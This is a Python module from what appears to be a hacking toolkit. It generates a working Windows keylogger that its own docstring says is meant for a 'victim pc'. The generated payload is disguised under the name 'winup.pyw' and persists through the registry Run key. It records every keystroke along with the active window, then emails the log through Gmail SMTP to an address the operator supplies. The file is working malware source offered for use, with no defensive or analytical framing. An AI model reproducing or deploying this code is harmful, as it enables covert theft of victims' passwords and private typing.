import user_information_module
from automatic_installation_module import *


class KeyHookModule(user_information_module.UserInfo):
    """
    This is key-logger created by me from scratch. If this key-logger will be on victim pc it
    will start automatically each time victim turn on computer. After collecting data from keyboard,
    key-hook automatically will sent collected data to chosen email.
    """

    def __repr__(self):
        return f"{self.__class__.__name__}"

    def __init__(self):
        super().__init__()
        self.check_default_key_hook_save: str = ""

    @staticmethod
    def key_hook_check_compatibility():
        if os.name == "nt":
            KeyHookModule().key_hook_module_menu()
        elif os.name != "nt":
            print(
                f"{Bcolors.error_r}Error!{Bcolors.endc} Is not available on {Bcolors.warning}LINUX{Bcolors.endc} yet."
            )
            time.sleep(2)

    def key_hook_module_menu(self):
        print(70 * "-")
        print(
            f"Using this module you can generate{Bcolors.warning} KEY-HOOK{Bcolors.endc}. After generating\n"
            f"{Bcolors.warning}KEY-HOOK{Bcolors.endc} you can sent him to remote computer. When you run this script\n"
            "on other machines, script will hide in procces. When remote computer\nstarts up again, script too."
            " Script will sent all symbols input from\nkeyboard to given address email. Do you want to continue?"
            f"{Bcolors.warning} y/n{Bcolors.endc}?"
        )
        print(70 * "-")
        key_hook_command = input("> ")
        if key_hook_command.upper() == "Y":
            self.key_hook_generator()
        elif not key_hook_command.upper() == "N":
            print(f"{Bcolors.error_r}WRONG OPTION!{Bcolors.endc}")
            time.sleep(1.5)

    def key_hook_generator(self):
        Clear.clear()
        print(26 * "-" + f"{Bcolors.magenta}KEY-HOOK GENERATOR{Bcolors.endc}" + 26 * "-")
        print(f"For now working only with {Bcolors.warning}GMAIL{Bcolors.endc}")
        time.sleep(2)
        Clear.clear()
        try:
            if os.path.isdir(rf"C:\Users\{self.user_hostname}\Desktop"):
                if (
                    os.path.abspath(rf"C:\Users\{self.user_hostname}\Desktop")
                    == rf"C:\Users\{self.user_hostname}\Desktop"
                ):
                    self.check_default_key_hook_save = (
                        rf"C:\Users\{self.user_hostname}\Desktop\winup.pyw"
                    )
        except SyntaxError:
            print("I have problems with save!")
            time.sleep(2)
        finally:
            with open(self.check_default_key_hook_save, "w") as f:
                f.write(
                    r"""# -*- coding: utf-8 -*-
from ctypes import *
import pythoncom
import pynput 
from pynput.keyboard import Key, Listener 
import win32clipboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import sys, os
from os import path
import socket
import datetime
import getpass
import winreg
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
USER_NAME = getpass.getuser()
keyVal = 'Software\Microsoft\Windows\CurrentVersion\Run'
def add_to_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
    except:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)
    winreg.SetValueEx(key, "lx", 0, winreg.REG_SZ, rf"C:\Users\{USER_NAME}\Desktop\winup.pyw")
    winreg.CloseKey(key)
def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer(b"\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    window_title = create_string_buffer(b"\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    print()
    print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
    print()
    # zamknięcie uchwytów
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
keys = [] 
def on_press(key):
    keys.append(key) 
    write_file(keys) 
    try:
        pass  
    except AttributeError:
        print('') 
def write_file(keys):
    b = os.path.getsize(rf"C:\Users\{USER_NAME}\log.txt")
    key = rf"C:\Users\{USER_NAME}\log.txt"
    ip = socket.gethostbyname(socket.gethostname())
    date = datetime.datetime.now()
    date = date.strftime("%Y-%m-%d %H:%M")
    if b > 100:
        subject = f'IP: {ip}'
        message = f'Time: {date}'
        file_location = key
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = send_to_email
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'plain'))
        filename = os.path.basename(file_location)
        attachment = open(file_location, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(part)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = msg.as_string()
        server.sendmail(email, send_to_email, text)
        server.quit()
    with open(rf'C:\Users\{USER_NAME}\log.txt', 'w') as f: 
        for key in keys: 
            k = str(key).replace("'", "")
            if k == 'Key.space':
                f.write(' ')
            elif k == 'Key.shift_r' or k == 'Key.shift' or k == 'Key.esc' or k =='Key.backspaceping' or k == 'Key.backspace' or k == 'Key.ctrl_l':
                pass
            elif k == 'Key.tab' or k == 'Key.enter':
                f.write('\n')
            else: 
                f.write(k)
def KeyStroke(event):
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    #global x
    #x = []
    #if event.Ascii > 32 and event.Ascii < 127:
        #x.append(event.Ascii)
        #x = ''.join(chr(i) for i in x)
        #with open(key, 'a') as fp:
            #fp.write(f'{x}')
    #if event.Ascii == 32 or event.Ascii == 9 or event.Ascii == 13:
        #with open(key, 'a') as fp:
            #fp.write('\n')
                """
                )
            print(f"Two email addresses {Bcolors.warning}required{Bcolors.endc}")
            print("Write the email name through which the script will send data: ", end="")
            sender_email = str(input())
            print("Write password of this email: ", end="")
            key_password = str(input())
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            try:
                server.login(f"{sender_email}", f"{key_password}")
            except smtplib.SMTPAuthenticationError:
                print(f"{Bcolors.error_r}ERROR!{Bcolors.endc} Wrong Credentials!")
                os.remove(rf"C:\Users\{self.user_hostname}\Desktop\winup.pyw")
                time.sleep(2)
                sys.exit(0)
            server.quit()
            print("Here write email name where script will send data: ", end="")
            key_send_to_email = str(input())
            print(
                "\nThe script will send all symbols from the keyboard on the computer on which\nit will run to this"
                f" email address: {Bcolors.warning}{key_send_to_email}{Bcolors.endc}"
            )
            input("Press enter to continue...")
            with open(rf"C:\Users\{self.user_hostname}\log.txt", "w") as f:
                f.write(str("="))
            with open(self.check_default_key_hook_save, "a") as f:
                f.write(
                    rf"""
email = f'{sender_email}'
password = f'{key_password}'
send_to_email = f'{key_send_to_email}'
add_to_registry()
listener = Listener(on_press=on_press)
listener.start()
pythoncom.PumpMessages()
            """
                )
            print(
                f"\nScript saved here: {Bcolors.warning}{self.check_default_key_hook_save}{Bcolors.endc}"
            )
            time.sleep(3)
